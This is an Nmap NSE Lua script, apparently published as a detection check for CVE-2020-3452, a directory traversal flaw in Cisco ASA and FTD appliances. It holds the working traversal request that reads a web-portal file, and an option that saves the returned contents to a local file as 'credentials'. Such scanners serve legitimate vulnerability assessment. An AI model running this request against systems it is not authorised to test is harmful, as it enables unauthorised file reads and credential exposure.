local http = require "http"
local stdnse = require "stdnse"
local shortport = require "shortport"
local table = require "table"
local string = require "string"
local vulns = require "vulns"
local nmap = require "nmap"
local io = require "io"

description = [[
This NSE script checks whether the target server is vulnerable to CVE-2020-3452
]]
---
-- @usage
-- nmap --script http-vuln-cve2020-3452 -p <port> <host>
-- nmap --script http-vuln-cve2020-3452 -p <port> <host> --script-args output='file.txt'
-- @output
-- PORT   STATE SERVICE
-- 443/tcp open  http
-- | CVE-2020-3452: 
-- |   Host is vulnerable to CVE-2020-3452
-- @changelog
-- 01-07-2020 - Discovery: Mikhail Klyuchnikov & Ahmed Aboul-Ela 
-- 05-07-2020 - Author: Dhiraj Mishra --[[ NMAP Script--]]
-- @xmloutput
-- <table key="NMAP-1">
-- <elem key="title">Cisco Adaptive Security Appliance and FTD Unauthorized Remote File Reading</elem>
-- <elem key="state">VULNERABLE</elem>
-- <table key="description">
-- <elem>A vulnerability in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and read sensitive files on a targeted system. The vulnerability is due to a lack of proper input validation of URLs in HTTP requests processed by an affected device. An attacker could exploit this vulnerability by sending a crafted HTTP request containing directory traversal character sequences to an affected device. A successful exploit could allow the attacker to view arbitrary files within the web services file system on the targeted device. The web services file system is enabled when the affected device is configured with either WebVPN or AnyConnect features. This vulnerability cannot be used to obtain access to ASA or FTD system files or underlying operating system (OS) files. 
-- </table>
-- <table key="dates">
-- <table key="disclosure">
-- <elem key="year">2020</elem>
-- <elem key="day">22</elem>
-- <elem key="month">07</elem>
-- </table>
-- </table>
-- <elem key="disclosure">01-07-2020</elem>
-- <table key="extra_info">
-- </table>
-- <table key="refs">
-- <elem>https://nvd.nist.gov/vuln/detail/CVE-2020-3452</elem>
-- <elem>https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86</elem>
-- </table>
-- </table>

author = "Dhiraj Mishra (@RandomDhiraj)" --[[ NMAP Script--]]
Discovery = "Mikhail Klyuchnikov & Ahmed Aboul-Ela"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "intrusive","vuln"}

portrule = shortport.ssl

action = function(host,port)
  local outputFile = stdnse.get_script_args(SCRIPT_NAME..".output") or nil
  local vuln = {
    title = 'CISCO ASA/FTD Read-Only Path Traversal Vulnerability',
    state = vulns.STATE.NOT_VULN,
    description = [[
	 A vulnerability in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and read sensitive files on a targeted system. The vulnerability is due to a lack of proper input validation of URLs in HTTP requests processed by an affected device. An attacker could exploit this vulnerability by sending a crafted HTTP request containing directory traversal character sequences to an affected device. A successful exploit could allow the attacker to view arbitrary files within the web services file system on the targeted device. The web services file system is enabled when the affected device is configured with either WebVPN or AnyConnect features. This vulnerability cannot be used to obtain access to ASA or FTD system files or underlying operating system (OS) files.
    ]],
    references = {
      'https://nvd.nist.gov/vuln/detail/CVE-2020-3452',
      'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86',
    },
    dates = {
      disclosure = {year = '2020', month = '07', day = '22'},
    },
  }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local path = "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"
  local response
  local output = {}
  local success = "Host is vulnerable to CVE-2020-3452"
  local fail = "Host is not vulnerable"
  local match = 'INTERNAL_PASSWORD_ENABLED'
  local credentials
  local CASA
	
  response = http.get(host, port.number, path)  

  if not response.status then
    stdnse.print_debug("Request Failed")
    return
  end
  if response.status == 200 then
    if string.match(response.body, match) then
      stdnse.print_debug("%s: %s GET %s - 200 OK", SCRIPT_NAME,host.targetname or host.ip, path)
      vuln.state = vulns.STATE.VULN
      CASA = (("Verify arbitrary file read: https://%s:%d%s"):format(host.targetname or host.ip,port.number, path))
		
      if outputFile then
        credentials = response.body:gsub('%W','.')
	vuln.check_results = stdnse.format_output(true, CASA)
        vuln.extra_info = stdnse.format_output(true, "Credentials are being stored in the output file")
	file = io.open(outputFile, "a")
	file:write(credentials, "\n")
      else
        vuln.check_results = stdnse.format_output(true, CASA)
      end
    end
  elseif response.status == 403 then
    stdnse.print_debug("%s: %s GET %s - %d", SCRIPT_NAME, host.targetname or host.ip, path, response.status)
    vuln.state = vulns.STATE.NOT_VULN
  end

  return vuln_report:make_output(vuln)
end
